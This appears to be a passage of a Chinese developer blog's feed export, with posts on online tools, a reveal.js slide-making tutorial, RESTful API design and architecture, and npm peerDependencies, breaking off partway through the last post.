<p>这个网站还有很多其他工具，如<a href="https://www.sojson.com/web/use.html" target="_blank" rel="noopener">网页颜色搭配</a>等</p>
<h1 id="时间戳在线转换工具"><a href="#时间戳在线转换工具" class="headerlink" title="时间戳在线转换工具"></a>时间戳在线转换工具</h1><p><a href="https://tool.lu/timestamp/" target="_blank" rel="noopener">网站</a></p>
<h1 id="base64和图片互转"><a href="#base64和图片互转" class="headerlink" title="base64和图片互转"></a>base64和图片互转</h1><p><a href="http://tool.chinaz.com/tools/imgtobase/" target="_blank" rel="noopener">网站</a></p>
<h1 id="视频转gif"><a href="#视频转gif" class="headerlink" title="视频转gif"></a>视频转gif</h1><p><a href="https://ezgif.com/video-to-gif" target="_blank" rel="noopener">网站</a></p>
<p>找了很多都有视频大小的限制，这个没有限制。</p>
<h1 id="图片在线压缩"><a href="#图片在线压缩" class="headerlink" title="图片在线压缩"></a>图片在线压缩</h1><p><a href="https://www.bejson.com/ui/compress_img/" target="_blank" rel="noopener">网站</a></p>
<h1 id="mdnice-markdown编辑器"><a href="#mdnice-markdown编辑器" class="headerlink" title="mdnice-markdown编辑器"></a>mdnice-markdown编辑器</h1><p>地址 <a href="https://editor.mdnice.com/" target="_blank" rel="noopener">https://editor.mdnice.com/</a></p>
<p>让markdown更美观，自己发公众号文章的时候经常用。</p>
<p>你还有推荐的工具欢迎在下方评论中留言哦~</p>
]]></content>
  </entry>
  <entry>
    <title>掘金文章的主题</title>
    <url>/2021/01/13/%E6%8E%98%E9%87%91%E6%96%87%E7%AB%A0%E7%9A%84%E4%B8%BB%E9%A2%98/</url>
    <content><![CDATA[<p>linux常用 <a href="https://www.cnblogs.com/sparkbj/p/6148817.html" target="_blank" rel="noopener">https://www.cnblogs.com/sparkbj/p/6148817.html</a></p>
<ul>
<li>koa框架源码</li>
<li>微前端</li>
<li>mysql知识</li>
<li>g6/gg-editor</li>
<li>图像</li>
<li>webpack</li>
<li>linux命令</li>
<li><a href="https://www.cnblogs.com/mafeng/p/10696956.html" target="_blank" rel="noopener">https://www.cnblogs.com/mafeng/p/10696956.html</a></li>
<li><a href="https://www.cnblogs.com/psc0218/p/12679425.html" target="_blank" rel="noopener">https://www.cnblogs.com/psc0218/p/12679425.html</a></li>
<li><a href="https://www.cnblogs.com/mingaixin/p/4304699.html" target="_blank" rel="noopener">https://www.cnblogs.com/mingaixin/p/4304699.html</a></li>
<li><p>docker</p>
</li>
<li><p>ts用法总结 done</p>
</li>
<li>工具分享 done</li>
<li>reveal.js done</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>reveal.js</title>
    <url>/2021/01/20/reveal-js/</url>
    <content><![CDATA[<h1 id="妈妈再也不用担心我的PPT了——PPT神器reveal-js"><a href="#妈妈再也不用担心我的PPT了——PPT神器reveal-js" class="headerlink" title="妈妈再也不用担心我的PPT了——PPT神器reveal.js"></a>妈妈再也不用担心我的PPT了——PPT神器reveal.js</h1><p>写PPT比写文档要麻烦一些，需要选择合适的模板，根据内容去调整模板，比如调整字号、间距、背景、动画…那么有没有一种工具可以让我们只专注于PPT的内容本身呢？当然有，答案就是<a href="https://github.com/hakimel/reveal.js" target="_blank" rel="noopener">reveal.js</a></p>
<h1 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h1><p>先给大家演示下效果</p>
<p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/reveal-js-article/ezgif-7-1e3d187f0569.gif" alt></p>
<p>reveal.js是一个开源的PPT框架，可以帮助你自由地在浏览器生成功能强大且简洁直观的PPT。</p>
<p>它支持了很完整的PPT功能，如嵌套幻灯片、Markdown支持、自动设置动画、PDF导出、演讲者提示、LaTeX支持、代码高亮…</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>reveal.js有Basic Setup和Full Setup两种安装方式</p>
<p>推荐Full Setup安装(它支持所有功能，比如external Markdown)。</p>
<p>Full Setup的安装步骤如下：</p>
<ol>
<li><p>安装Node.js (&gt;=10.0.0)</p>
</li>
<li><p>克隆reveal.js仓库</p>
</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/hakimel/reveal.js.git</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>安装dependencies</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd reveal.js &amp;&amp; npm install</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>启动服务</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm start</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>打开 <a href="http://localhost:8000" target="_blank" rel="noopener">http://localhost:8000</a> 就可以查看b并调试你的PPT了。</li>
</ol>
<h2 id="推荐使用markdown"><a href="#推荐使用markdown" class="headerlink" title="推荐使用markdown"></a>推荐使用markdown</h2><p>我使用reveal.js制作过三次PPT。</p>
<p>第1次是在一个小游戏活动环节，使用html+js编写的内容，有随机选成语、倒计时等功能。由于reveal.js是使用前端技术实现的，所以你可以自由地设计一些游戏内容，这个优势是普通PPT所不具备的。</p>
<p>第2次是一次分享，采用html编写的内容。</p>
<p>最后一次还是分享，不过这次使用了markdown来编写内容。</p>
<p>通过第2次和第3次的使用经历，我觉得markdown是最方便的PPT制作方式。它不仅能让你完全专注于内容本身，并且这些内容就是一个个markdown文件，而不会像使用html那样会被一些标签割裂开来。使用markdown制作PPT，就和你写一份普通文档没有区别。</p>
<h2 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h2><p>执行npm start后，打开 <a href="http://localhost:8000" target="_blank" rel="noopener">http://localhost:8000</a> 就可以看到PPT的内容了。</p>
<p>PPT的所有内容都在根目录下的index.html文件中，你只需要在index.html中填写内容就可以了。每个section标签包裹的就是一页ppt的内容。至于PPT的呈现效果（样式），reveal.js内置的css样式文件里已经都给你实现好了，你不需要关心这个。当然，如果你想修改PPT的呈现效果，也是可以去修改它的css文件的。</p>
<h2 id="选择主题"><a href="#选择主题" class="headerlink" title="选择主题"></a>选择主题</h2><p>reveal.js内置了很多主题，满足不同喜好。</p>
<p>你只需要将index.html文件中的link标签的href属性换成相应主题即可。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/theme/league.css"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="使用markdown"><a href="#使用markdown" class="headerlink" title="使用markdown"></a>使用markdown</h2><p>要使用markdown，你需要在index.html中引入插件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"plugin/markdown/marked.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"plugin/markdown/markdown.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后初始化一下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">  Reveal.initialize(&#123;</span><br><span class="line">    dependencies: [</span><br><span class="line"><span class="javascript">      &#123; <span class="attr">src</span>: <span class="string">"plugin/markdown/marked.js"</span> &#125;,</span></span><br><span class="line"><span class="javascript">      &#123; <span class="attr">src</span>: <span class="string">"plugin/markdown/markdown.js"</span> &#125;,</span></span><br><span class="line"><span class="javascript">      &#123; <span class="attr">src</span>: <span class="string">"plugin/notes/notes.js"</span>, <span class="attr">async</span>: <span class="literal">true</span> &#125;,</span></span><br><span class="line"><span class="javascript">      &#123; <span class="attr">src</span>: <span class="string">"plugin/highlight/highlight.js"</span>, <span class="attr">async</span>: <span class="literal">true</span> &#125;</span></span><br><span class="line">    ],</span><br><span class="line"><span class="javascript">    hash: <span class="literal">true</span></span></span><br><span class="line">  &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样你就可以编写markdown来制作PPT了。</p>
<p>它支持内联markdown</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;section data-markdown&gt;</span><br><span class="line">  &lt;textarea data-template&gt;</span><br><span class="line">    ## Slide 1</span><br><span class="line">    A paragraph <span class="keyword">with</span> some text and a [link](http:<span class="comment">//hakim.se).</span></span><br><span class="line">    ---</span><br><span class="line">    ## Slide 2</span><br><span class="line">    ---</span><br><span class="line">    ## Slide 3</span><br><span class="line">  &lt;<span class="regexp">/textarea&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>section&gt;</span><br></pre></td></tr></table></figure>
<p>也支持外部引入markdown</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"slides"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">section</span> <span class="attr">data-markdown</span>=<span class="string">"sections/1.md"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">data-separator</span>=<span class="string">"^\n\n\n"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">data-separator-vertical</span>=<span class="string">"^\n\n"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">data-separator-notes</span>=<span class="string">"^Note:"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">data-charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  Note that Windows uses `\r\n` instead of `\n` as its linefeed character.</span></span><br><span class="line"><span class="comment">  For a regex that supports all operating systems, use `\r?\n` instead of `\n`.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="comment">&lt;!-- sections/1.md --&gt;</span></span></span><br><span class="line"><span class="section">## Chrome 插件开发</span></span><br></pre></td></tr></table></figure>
<p>外部引入markdown这种方式可以让你的markdown内容更纯粹，不用和html标签混杂在一起，所以比较推荐这种方式。</p>
<h2 id="PDF导出"><a href="#PDF导出" class="headerlink" title="PDF导出"></a>PDF导出</h2><p>如果我们想把PPT分享给别人，显然不能把一个前端工程发个他，所以reveal.js也支持PDF导出。</p>
<p>只需很简单的几步操作</p>
<ol>
<li>访问 <a href="http://localhost:8000/?print-pdf" target="_blank" rel="noopener">http://localhost:8000/?print-pdf</a></li>
<li>打开打印窗口(CTRL/CMD+P)</li>
<li>自定义一些配置项，点击保存即可</li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上介绍的内容大概能满足你的需要了，当然reveal.js还有很多强大的功能这里没有介绍，感兴趣的朋友可以查看<a href="https://revealjs.com/" target="_blank" rel="noopener">官网</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://revealjs.com/" target="_blank" rel="noopener">官网</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>yarn2</title>
    <url>/2021/03/08/yarn2/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>设计准则</title>
    <url>/2021/03/08/%E8%AE%BE%E8%AE%A1%E5%87%86%E5%88%99/</url>
    <content><![CDATA[<p>从第3页开始</p>
]]></content>
  </entry>
  <entry>
    <title>RESTfulAPI设计指南</title>
    <url>/2021/03/27/RESTfulAPI%E8%AE%BE%E8%AE%A1%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<p>RESTful API是目前比较成熟的一套互联网应用程序的API设计理论。</p>
<h1 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h1><p>API与用户的通信协议，总是使用HTTPs协议。</p>
<h1 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h1><p>尽量将API部署在专用域名之下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://api.example.com</span><br></pre></td></tr></table></figure>
<p>如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://example.org/api/</span><br></pre></td></tr></table></figure>
<h1 id="版本（Versioning）"><a href="#版本（Versioning）" class="headerlink" title="版本（Versioning）"></a>版本（Versioning）</h1><p>应该将API的版本号放入URL。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://api.example.com/v1/</span><br></pre></td></tr></table></figure>
<p>另一种做法是，将版本号放在HTTP头信息中，但不如放入URL方便和直观。</p>
<h1 id="路径（Endpoint）"><a href="#路径（Endpoint）" class="headerlink" title="路径（Endpoint）"></a>路径（Endpoint）</h1><p>路径又称”终点”（endpoint），表示API的具体网址。</p>
<p>在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的”集合”（collection），所以API中的名词也应该使用复数。</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://api.example.com/v1/zoos // 获取所有动物园信息</span><br><span class="line">https://api.example.com/v1/animals // 获取所有动物信息</span><br></pre></td></tr></table></figure>
<h1 id="HTTP动词"><a href="#HTTP动词" class="headerlink" title="HTTP动词"></a>HTTP动词</h1><p>对于资源的具体操作类型，由HTTP动词表示。</p>
<p>常用的HTTP动词有下面五个（括号里是对应的SQL命令）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET（SELECT）：从服务器取出资源（一项或多项）。</span><br><span class="line">POST（CREATE）：在服务器新建一个资源。</span><br><span class="line">PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。</span><br><span class="line">PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。</span><br><span class="line">DELETE（DELETE）：从服务器删除资源。</span><br></pre></td></tr></table></figure>
<p>还有两个不常用的HTTP动词。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HEAD：获取资源的元数据。</span><br><span class="line">OPTIONS：获取信息，关于资源的哪些属性是客户端可以改变的。</span><br></pre></td></tr></table></figure>
<p>下面是一些例子。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /zoos：列出所有动物园</span><br><span class="line">POST /zoos：新建一个动物园</span><br><span class="line">GET /zoos/ID：获取某个指定动物园的信息</span><br><span class="line">PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息）</span><br><span class="line">PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息）</span><br><span class="line">DELETE /zoos/ID：删除某个动物园</span><br><span class="line">GET /zoos/ID/animals：列出某个指定动物园的所有动物</span><br><span class="line">DELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物</span><br></pre></td></tr></table></figure>
<h1 id="过滤信息（Filtering）"><a href="#过滤信息（Filtering）" class="headerlink" title="过滤信息（Filtering）"></a>过滤信息（Filtering）</h1><p>如果记录数量很多，服务器不可能都将它们返回给用户。API应该提供参数，过滤返回结果。</p>
<p>下面是一些常见的参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?limit=10：指定返回记录的数量</span><br><span class="line">?offset=10：指定返回记录的开始位置。</span><br><span class="line">?page=2&amp;per_page=100：指定第几页，以及每页的记录数。</span><br><span class="line">?sortby=name&amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。</span><br><span class="line">?animal_type_id=1：指定筛选条件</span><br></pre></td></tr></table></figure>
<p>参数的设计允许存在冗余，即允许API路径和URL参数偶尔有重复。比如，GET /zoo/ID/animals 与 GET /animals?zoo_id=ID 的含义是相同的。</p>
<h1 id="状态码（Status-Codes）"><a href="#状态码（Status-Codes）" class="headerlink" title="状态码（Status Codes）"></a>状态码（Status Codes）</h1><p>服务器向用户返回的状态码和提示信息，常见的有以下一些（方括号中是该状态码对应的HTTP动词）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的（Idempotent）。</span><br><span class="line">201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。</span><br><span class="line">202 Accepted - [*]：表示一个请求已经进入后台排队（异步任务）</span><br><span class="line">204 NO CONTENT - [DELETE]：用户删除数据成功。</span><br><span class="line">400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。</span><br><span class="line">401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。</span><br><span class="line">403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。</span><br><span class="line">404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。</span><br><span class="line">406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。</span><br><span class="line">410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。</span><br><span class="line">422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。</span><br><span class="line">500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。</span><br></pre></td></tr></table></figure>
<p>状态码的完全列表参见<a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html" target="_blank" rel="noopener">这里</a>。</p>
<h1 id="错误处理（Error-handling）"><a href="#错误处理（Error-handling）" class="headerlink" title="错误处理（Error handling）"></a>错误处理（Error handling）</h1><p>如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"error"</span>: <span class="string">"Invalid API key"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="返回结果"><a href="#返回结果" class="headerlink" title="返回结果"></a>返回结果</h1><p>针对不同操作，服务器向用户返回的结果应该符合以下规范。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /collection：返回资源对象的列表（数组）</span><br><span class="line">GET /collection/resource：返回单个资源对象</span><br><span class="line">POST /collection：返回新生成的资源对象</span><br><span class="line">PUT /collection/resource：返回完整的资源对象</span><br><span class="line">PATCH /collection/resource：返回完整的资源对象</span><br><span class="line">DELETE /collection/resource：返回一个空文档</span><br></pre></td></tr></table></figure>
<h1 id="Hypermedia-API"><a href="#Hypermedia-API" class="headerlink" title="Hypermedia API"></a>Hypermedia API</h1><p>RESTful API最好做到Hypermedia，即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么。</p>
<p>比如，当用户向api.example.com的根目录发出请求，会得到这样一个文档。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"link"</span>: &#123;</span><br><span class="line">  <span class="attr">"rel"</span>:   <span class="string">"collection https://www.example.com/zoos"</span>,</span><br><span class="line">  <span class="attr">"href"</span>:  <span class="string">"https://api.example.com/zoos"</span>,</span><br><span class="line">  <span class="attr">"title"</span>: <span class="string">"List of zoos"</span>,</span><br><span class="line">  <span class="attr">"type"</span>:  <span class="string">"application/vnd.yourformat+json"</span></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码表示，文档中有一个link属性，用户读取这个属性就知道下一步该调用什么API了。rel表示这个API与当前网址的关系（collection关系，并给出该collection的网址），href表示API的路径，title表示API的标题，type表示返回类型。</p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>（1）API的身份认证应该使用<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">OAuth 2.0</a>框架。</p>
<p>（2）服务器返回的数据格式，应该尽量使用JSON，避免使用XML。</p>
<h1 id="实践总结"><a href="#实践总结" class="headerlink" title="实践总结"></a>实践总结</h1><ol>
<li>使用http或https协议</li>
<li>API可以是特定的域名，有的也可以使用主域名。</li>
<li>将API的版本号放入URL。</li>
<li>URL不能有动词，只能有名词，应该使用复数。</li>
<li>对于资源的具体操作类型，由HTTP动词表示。</li>
<li>常用的HTTP动词有POST、GET、PUT、DELETT，分别对应CRUD（增删改查）。</li>
<li>分页、排序、筛选等在过滤信息（Filtering）中显示，即query参数</li>
<li>常使用的状态码有：200 OK/401 Unauthorized/403 Forbidden/404 NOT FOUND/500 INTERNAL SERVER ERROR</li>
<li>错误处理：返回的信息中将error作为键名，出错信息作为键值。</li>
<li>针对不同操作，服务器向用户返回符合规范的结果。</li>
<li>RESTful API最好做到Hypermedia，一般去做，但会有API管理系统或文档。</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://www.ruanyifeng.com/blog/2014/05/restful_api.html" target="_blank" rel="noopener">RESTful API 设计指南</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>理解RESTful架构</title>
    <url>/2021/03/27/%E7%90%86%E8%A7%A3RESTful%E6%9E%B6%E6%9E%84/</url>
    <content><![CDATA[<p>RESTful架构，就是目前最流行的一种互联网软件架构。它结构清晰、符合标准、易于理解、扩展方便，所以正得到越来越多网站的采用。</p>
<h1 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h1><p>REST这个词，是Roy Thomas Fielding在他2000年的博士论文中提出的。</p>
<p>他这样介绍论文的写作目的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;本文研究计算机科学两大前沿----软件和网络----的交叉点。长期以来，软件研究主要关注软件设计的分类、设计方法的演化，很少客观地评估不同的设计选择对系统行为的影响。而相反地，网络研究主要关注系统之间通信行为的细节、如何改进特定通信机制的表现，常常忽视了一个事实，那就是改变应用程序的互动风格比改变互动协议，对整体表现有更大的影响。我这篇文章的写作目的，就是想在符合架构原理的前提下，理解和评估以网络为基础的应用软件的架构设计，得到一个功能强、性能好、适宜通信的架构。&quot;</span><br></pre></td></tr></table></figure>
<h1 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h1><p>Fielding将他对互联网软件的架构原则，定名为REST，即Representational State Transfer(表现层状态转化)的缩写。</p>
<p>如果一个架构符合REST原则，就称它为RESTful架构。</p>
<h1 id="资源（Resources）"><a href="#资源（Resources）" class="headerlink" title="资源（Resources）"></a>资源（Resources）</h1><p>“表现层”其实指的是”资源”（Resources）的”表现层”。</p>
<p>所谓”资源”，就是网络上的一个实体，或者说是网络上的一个具体信息。它可以是一段文本、一张图片、一首歌曲、一种服务。</p>
<p>你可以用一个URI（统一资源定位符）指向它，每种资源对应一个特定的URI，因此URI就成了每一个资源的地址或独一无二的识别符。</p>
<p>所谓”上网”，就是与互联网上一系列的”资源”互动，调用它的URI。</p>
<h1 id="表现层（Representation）"><a href="#表现层（Representation）" class="headerlink" title="表现层（Representation）"></a>表现层（Representation）</h1><p>“资源”是一种信息实体，它可以有多种外在表现形式。我们把”资源”具体呈现出来的形式，叫做它的”表现层”（Representation）。</p>
<p>比如，文本可以用txt格式表现，也可以用HTML格式、XML格式、JSON格式表现，甚至可以采用二进制格式；图片可以用JPG格式表现，也可以用PNG格式表现。</p>
<p>URI只代表资源的实体，不代表它的形式。严格地说，有些网址最后的”.html”后缀名是不必要的，因为这个后缀名表示格式，属于”表现层”范畴，而URI应该只代表”资源”的位置。它的具体表现形式，应该在HTTP请求的头信息中用Accept和Content-Type字段指定，这两个字段才是对”表现层”的描述。</p>
<h1 id="状态转化（State-Transfer）"><a href="#状态转化（State-Transfer）" class="headerlink" title="状态转化（State Transfer）"></a>状态转化（State Transfer）</h1><p>访问一个网站，就代表了客户端和服务器的一个互动过程。在这个过程中，势必涉及到数据和状态的变化。</p>
<p>互联网通信协议HTTP协议，是一个无状态协议。这意味着，所有的状态都保存在服务器端。因此，如果客户端想要操作服务器，必须通过某种手段，让服务器端发生”状态转化”（State Transfer）。而这种转化是建立在表现层之上的，所以就是”表现层状态转化”。</p>
<p>客户端用到的手段，只能是HTTP协议。具体来说，就是HTTP协议里面，四个表示操作方式的动词：GET、POST、PUT、DELETE。它们分别对应四种基本操作：GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT用来更新资源，DELETE用来删除资源。</p>
<h1 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h1><p>综合上面的解释，我们总结一下什么是RESTful架构：</p>
<ul>
<li>每一个URI代表一种资源；</li>
<li>客户端和服务器之间，传递这种资源的某种表现层；</li>
<li>客户端通过四个HTTP动词，对服务器端资源进行操作，实现”表现层状态转化”。</li>
</ul>
<h1 id="误区"><a href="#误区" class="headerlink" title="误区"></a>误区</h1><p>RESTful架构有一些典型的设计误区。</p>
<p>最常见的一种设计错误，就是URI包含动词。因为”资源”表示一种实体，所以应该是名词，URI不应该有动词，动词应该放在HTTP协议中</p>
<p>如果某些动作是HTTP动词表示不了的，你就应该把动作做成一种资源。比如网上汇款，从账户1向账户2汇款500元，错误的URI是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /accounts/1/transfer/500/to/2</span><br></pre></td></tr></table></figure>
<p>正确的写法是把动词transfer改成名词transaction，资源不能是动词，但是可以是一种服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /transaction HTTP/1.1</span><br><span class="line">　　</span><br><span class="line">from=1&amp;to=2&amp;amount=500.00</span><br></pre></td></tr></table></figure>
<p>另一个设计误区，就是在URI中加入版本号：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.example.com/app/1.0/foo</span><br><span class="line">http://www.example.com/app/1.1/foo</span><br><span class="line">http://www.example.com/app/2.0/foo</span><br></pre></td></tr></table></figure>
<p>因为不同的版本，可以理解成同一种资源的不同表现形式，所以应该采用同一个URI。版本号可以在HTTP请求头信息的Accept字段中进行区分（参见Versioning REST Services）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept: vnd.example-com.foo+json; version=1.0</span><br><span class="line"></span><br><span class="line">Accept: vnd.example-com.foo+json; version=1.1</span><br><span class="line"></span><br><span class="line">Accept: vnd.example-com.foo+json; version=2.0</span><br></pre></td></tr></table></figure>
<p>不过很多api的版本号都是这么设计的，在URL上显示更加直观，你也可以理解为是不同的资源。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://www.ruanyifeng.com/blog/2011/09/restful.html" target="_blank" rel="noopener">理解RESTful架构</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>peerDependencies完全解读</title>
    <url>/2021/03/27/%E7%90%86%E8%A7%A3peerDependencies/</url>
    <content><![CDATA[<h1 id="dependencies和devDependencies"><a href="#dependencies和devDependencies" class="headerlink" title="dependencies和devDependencies"></a>dependencies和devDependencies</h1><p>dependencies和devDependencies在开发中很常用，dependencies依赖的包会被<code>在部署环境中安装</code>，比如vue、react这些。devDependencies是开发过程中的依赖，如eslint。那么什么是peerDependencies呢？</p>
<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>首先举个例子。打开ant design组件库（antd）的github<a href="https://github.com/ant-design/ant-design/blob/master/package.json" target="_blank" rel="noopener">项目地址</a>，你会发现它的package.json中不仅有dependencies、devDependencies，还有peerDependencies。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;peerDependencies&quot;: &#123;</span><br><span class="line">  &quot;react&quot;: &quot;&gt;=16.9.0&quot;,</span><br><span class="line">  &quot;react-dom&quot;: &quot;&gt;=16.9.0&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<p>它的作用是，如果你的工程dependencies有react(&gt;=16.9.0)，那么antd库就不会再安装react了，而是直接使用工程里的react（react-dom同理）。</p>
<p>简单来说就是，这样声明依赖后，node_modules目录结构变成了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├── your-project</span><br><span class="line">│   └── node_modules</span><br><span class="line">│       ├── react</span><br><span class="line">│       ├── antd</span><br><span class="line">│       │   └── nodule_modules</span><br></pre></td></tr></table></figure>
<p>试想，如果antd的依赖使用dependencies声明</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;dependencies&quot;: &#123;</span><br><span class="line">  &quot;react&quot;: &quot;&gt;=16.9.0&quot;,</span><br><span class="line">  &quot;react-dom&quot;: &quot;&gt;=16.9.0&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么它的node_modules目录结构就会变成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├── your-project</span><br><span class="line">│   └── node_modules</span><br><span class="line">│       ├── react@x.x.x</span><br><span class="line">│       ├── antd</span><br><span class="line">│       │   └── nodule_modules</span><br><span class="line">│       │       └── react@16.9.0</span><br></pre></td></tr></table></figure>
<p>也就是说工程里会用到两个版本的react，这很可能会导致一些问题。一般对于基础库，一个工程里只会安装一个且它的版本也是固定的，需要升级的时候再统一处理兼容性问题进行升级。</p>
<p>所以对于antd这种依赖于react的组件库来说，peerDependencies就很适用了，如果主工程的会安装合适的react版本，组件库共用这个版本的react就可以了，而不需要再安装一个，也不会出现不同版本的兼容性问题。</p>
<h1 id="常在插件中使用"><a href="#常在插件中使用" class="headerlink" title="常在插件中使用"></a>常在插件中使用</h1><p>peerDependencies在进行插件开发时经常会用到</p>
<p>插件一般有如下特点：</p>
<ul>
<li>插件正确运行的前提是，核心依赖库必须先下载安装，不能脱离核心依赖库而被单独依赖并引用</li>
<li>在项目实践中，同一插件体系下，核心依赖库版本最好是相同的</li>
</ul>
<p>而使用peerDependencies就可以满足这些要求：</p>
<ul>
